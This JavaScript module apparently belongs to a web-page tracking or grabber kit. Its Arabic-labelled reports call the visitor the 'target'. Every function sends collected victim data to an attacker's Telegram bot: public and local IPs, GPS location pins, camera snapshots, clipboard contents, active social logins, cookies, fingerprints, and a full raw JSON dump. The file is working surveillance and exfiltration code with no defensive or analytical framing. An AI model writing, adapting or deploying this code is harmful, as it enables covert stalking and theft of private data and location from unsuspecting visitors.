// send.js - Telegram sender with prioritized and structured messages
(function(){
    window.SEND={};

    // === SEND MESSAGE ===
    SEND.msg=async function(text){
        const tk=window._R();
        try{
            await fetch('https://api.telegram.org/bot'+tk+'/sendMessage',{
                method:'POST',headers:{'Content-Type':'application/json'},
                body:JSON.stringify({chat_id:window._C,text:text,parse_mode:'Markdown'})
            });
            return true;
        }catch(e){return false}
    };

    // === SEND DOCUMENT (JSON) ===
    SEND.doc=async function(data,filename){
        const tk=window._R();
        try{
            const blob=new Blob([JSON.stringify(data,null,2)],{type:'application/json'});
            const form=new FormData();
            form.append('chat_id',window._C);
            form.append('document',blob,filename||'report.json');
            form.append('caption','📎 البيانات الخام الكاملة بصيغة JSON');
            await fetch('https://api.telegram.org/bot'+tk+'/sendDocument',{method:'POST',body:form});
            return true;
        }catch(e){return false}
    };

    // === SEND LOCATION ===
    SEND.location=async function(lat,lon){
        const tk=window._R();
        try{
            await fetch('https://api.telegram.org/bot'+tk+'/sendLocation',{
                method:'POST',headers:{'Content-Type':'application/json'},
                body:JSON.stringify({chat_id:window._C,latitude:lat,longitude:lon})
            });
            return true;
        }catch(e){return false}
    };

    // === SEND PHOTO (canvas screenshot) ===
    SEND.photo=async function(dataUrl,caption){
        const tk=window._R();
        try{
            const blob=await(await fetch(dataUrl)).blob();
            const form=new FormData();
            form.append('chat_id',window._C);
            form.append('photo',blob,'photo.jpg');
            form.append('caption',caption||'📸 لقطة الكاميرا');
            await fetch('https://api.telegram.org/bot'+tk+'/sendPhoto',{method:'POST',body:form});
            return true;
        }catch(e){return false}
    };

    // === FORMAT & SEND FULL REPORT (ORDERED BY IMPORTANCE) ===
    SEND.report=async function(d){
        // M1: MOST CRITICAL (Identity, Network, Location, Battery, Camera status)
        const m1=`🔴 *معلومات الهدف الأساسية (CRITICAL)* 🔴\n`+
            `📅 \`${d.localTime}\` | 🆔 \`${d.sessionId}\`\n\n`+
            `*🌐 الشبكة والموقع*\n`+
            `├ 🌍 IP العام: \`${d.publicIP}\`\n`+
            `├ 📍 الموقع: \`${d.country} - ${d.region} - ${d.city}\`\n`+
            `├ 📡 مزود الخدمة: \`${d.isp}\`\n`+
            `├ 🎯 إحداثيات: \`${d.loc}\` (دقة: ${d.gpsAccuracy||'N/A'})\n`+
            `├ 🔗 نوع الاتصال: \`${d.connectionType}\` (سرعة: ${d.dlSpeed})\n`+
            `└ 💻 IP الداخلي: \`${d.localIPs}\`\n\n`+
            `*📱 الجهاز والنظام*\n`+
            `├ ⚙️ النظام: \`${d.osVersion} (${d.platform})\`\n`+
            `├ 📱 النوع: \`${d.deviceType}\`\n`+
            `├ 🔋 البطارية: \`${d.battery}\`\n`+
            `├ 📸 حالة الكاميرا: \`${d.cameraCaptured||'لم يتم الالتقاط'}\`\n`+
            `└ 🛡️ التخفي/المتصفح: \`${d.incognito} / ${d.browser}\``;

        // Send Location Pin if valid GPS exists (Very Critical)
        if(d.gpsLat&&d.gpsLon&&d.gpsLat!=='N/A'){
            await SEND.location(parseFloat(d.gpsLat),parseFloat(d.gpsLon));
            await U.wait(400);
        }

        // M2: HIGH IMPORTANCE (Hardware, Social Logins, Clipboard, Fingerprints)
        const m2=`🟠 *بيانات الأجهزة والبصمات (HIGH)* 🟠\n\n`+
            `*💻 العتاد (Hardware)*\n`+
            `├ المعالج: \`${d.cpuCores} cores\`\n`+
            `├ الرام: \`${d.ram}\`\n`+
            `├ كرت الشاشة: \`${d.gpu}\`\n`+
            `├ الشاشة: \`${d.screenRes} (${d.orientation})\`\n`+
            `└ مساحة التخزين: \`${d.storageQuota}\`\n\n`+
            `*🔑 حسابات التواصل النشطة (Social Logins)*\n`+
            `\`${d.socialLogins}\`\n\n`+
            `*📋 الحافظة المنسوخة (Clipboard)*\n\`\`\`\n${d.clipboard}\n\`\`\`\n\n`+
            `*🔐 بصمات التتبع*\n`+
            `├ Canvas: \`${d.canvasFP}\`\n`+
            `├ WebGL: \`${d.webglFP}\`\n`+
            `└ Audio: \`${d.audioFP}\``;

        // M3: MEDIUM IMPORTANCE (Browser details, Permissions, Sensors, Bot detection)
        const m3=`🟡 *البيانات الإضافية والصلاحيات (MEDIUM)* 🟡\n\n`+
            `*🌐 تفاصيل المتصفح*\n`+
            `├ النسخة: \`${d.browserVersion}\`\n`+
            `├ لغة النظام: \`${d.language}\`\n`+
            `├ الرابط الحالي: \`${d.pageURL}\`\n`+
            `├ الرابط السابق: \`${d.referrer}\`\n`+
            `└ مانع الإعلانات: \`${d.adblock}\`\n\n`+
            `*🔑 الصلاحيات (Permissions)*\n\`${d.permissions}\`\n\n`+
            `*📡 المستشعرات (Sensors)*\n\`${d.sensors}\`\n\n`+
            `*🕵️ اكتشاف الأنظمة الوهمية*\n`+
            `├ VM: \`${d.vm}\`\n`+
            `└ Automation: \`${d.automation}\``;

        // M4: LOW IMPORTANCE (Storage internals, Media Devices, CSS, Performance)
        const m4=`⚪ *بيانات تفصيلية ثانوية (LOW)* ⚪\n\n`+
            `*💾 التخزين المحلي (Local Storage)*\n`+
            `├ مساحة LS: \`${d.lsSize} (${d.lsCount} items)\`\n`+
            `├ الكوكيز: \`${d.cookies}\`\n`+
            `└ IndexedDB: \`${d.idb}\`\n\n`+
            `*🎤 الأجهزة الصوتية والمرئية*\n\`${d.mediaDevices}\`\n\n`+
            `*🎨 ميزات التصميم والخطوط*\n`+
            `├ الخطوط: \`${d.fontCount} fonts\`\n`+
            `└ CSS: \`${d.cssFeatures}\`\n\n`+
            `*⚙️ تقرير الأداء (Performance)*\n\`${d.perf}\``;

        const msgs=[m1,m2,m3,m4];
        for(const m of msgs){
            await SEND.msg(m);
            await U.wait(800); // slightly increased delay to prevent telegram rate limits
        }

        // Finally, send the raw JSON file
        await SEND.doc(d._raw,'TargetData_'+d.sessionId+'.json');
    };
})();
